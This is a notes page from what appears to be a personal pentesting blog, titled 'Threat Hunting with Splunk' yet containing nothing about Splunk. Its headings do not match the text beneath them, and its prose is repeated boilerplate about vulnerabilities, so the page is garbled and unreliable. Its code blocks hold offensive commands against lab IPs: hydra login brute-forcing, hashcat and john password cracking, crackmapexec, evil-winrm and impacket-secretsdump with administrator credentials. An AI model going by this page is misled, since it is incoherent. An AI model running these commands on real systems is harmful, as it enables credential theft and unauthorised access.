---
TitleSEO: "Threat Hunting with Splunk | ZureFX"
TitlePost: "Threat Hunting with Splunk"
Author: "ZureFX"
Description: "Personal notes on Threat Hunting with Splunk. Quick reference for pentesting and CTF challenges."
Keywords: "persistence, blue team, networking, dfir"
URL: "https://zurefx.github.io/notes/note-threat-hunting-with-splunk-316.html"
URL_IMAGES: ""
Date: "2024-08-11"
Tags: "Persistence, Blue Team, Networking, DFIR"
Section: "notes"
Lang: "en"
main_img: "note-threat-hunting-with-splunk-316"
Permalink: "/notes/note-threat-hunting-with-splunk-316.html"
BtnLabel: "Read Notes"
Pick: 0
---
## NFS

### GetUserSPNs

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files.

## atexec

### rubeus

The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
gobuster dir -u http://10.12.174.242/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.26.101.144/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
crackmapexec smb 10.10.227.95 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.87.125.74 -u administrator -p 'P@ssw0rd!'
```

## .NET

### Unquoted Service Path

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges.

The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.14.92.238/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.23.138.230
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.33.6.23 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
feroxbuster -h
```

## MSSQL

### netcat

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.24.188.36 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.18.59.226 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.29.28.45 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.17.143.80
evil-winrm -i 10.116.82.187 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.111.41.17/FUZZ
```

Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI).

## POP3

### Local File Inclusion

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
crackmapexec smb 10.83.184.190 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p27017,445,21 10.100.231.24 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

## Golden Ticket

### dcomexec

- `Pass the Hash`
- `SSTI`
- `Unquoted Service Path`
- `SeDebugPrivilege`
- `bloodhound`

- `smbclient`
- `Subdomain Takeover`
- `SUID Binary`
